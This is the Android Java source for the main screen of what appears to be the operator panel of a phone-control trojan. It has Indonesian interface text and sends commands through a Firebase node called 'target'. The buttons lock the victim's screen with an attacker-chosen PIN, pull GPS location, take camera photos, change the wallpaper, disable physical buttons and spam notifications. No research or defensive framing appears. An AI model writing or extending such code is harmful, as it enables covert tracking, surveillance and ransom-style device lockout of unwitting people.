package com.paragon.control;

import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {
    Switch swLockScreen;
    Button btnGanti, btnSetPin, btnGPS, btnCamera, btnWallpaper, btnBlockButtons, btnSpamNotif;
    EditText etNewPin;
    TextView tvResult;
    DatabaseReference mDatabase;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");

        swLockScreen = findViewById(R.id.swLockScreen);
        btnGanti = findViewById(R.id.btnGanti);
        btnSetPin = findViewById(R.id.btnSetPin);
        etNewPin = findViewById(R.id.etNewPin);
        btnGPS = findViewById(R.id.btnGPS);
        btnCamera = findViewById(R.id.btnCamera);
        btnWallpaper = findViewById(R.id.btnWallpaper);
        btnBlockButtons = findViewById(R.id.btnBlockButtons);
        btnSpamNotif = findViewById(R.id.btnSpamNotif);
        tvResult = findViewById(R.id.tvResult);

        // Lock Screen
        swLockScreen.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockScreen").setValue(isChecked);
            Toast.makeText(this, "Lock Screen: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // Ganti Target
        btnGanti.setOnClickListener(v -> {
            Toast.makeText(this, "Ganti target", Toast.LENGTH_SHORT).show();
        });

        // Set PIN
        btnSetPin.setOnClickListener(v -> {
            String newPin = etNewPin.getText().toString().trim();
            if (newPin.length() == 4) {
                mDatabase.child("pin").setValue(newPin);
                Toast.makeText(this, "PIN berhasil diubah!", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
            }
        });

        // GPS
        btnGPS.setOnClickListener(v -> {
            mDatabase.child("command").setValue("gps");
            tvResult.setText("📍 Mengambil lokasi...");
        });

        // Kamera
        btnCamera.setOnClickListener(v -> {
            mDatabase.child("command").setValue("camera");
            tvResult.setText("📸 Mengambil foto...");
        });

        // Ganti Wallpaper
        btnWallpaper.setOnClickListener(v -> {
            mDatabase.child("command").setValue("wallpaper");
            tvResult.setText("🖼 Mengganti wallpaper...");
        });

        // Matiin Tombol
        btnBlockButtons.setOnClickListener(v -> {
            mDatabase.child("command").setValue("block_buttons");
            tvResult.setText("🔒 Tombol fisik dimatikan...");
        });

        // Spam Notif
        btnSpamNotif.setOnClickListener(v -> {
            mDatabase.child("command").setValue("spam_notif");
            tvResult.setText("📨 Mengirim spam notifikasi...");
        });
    }
}
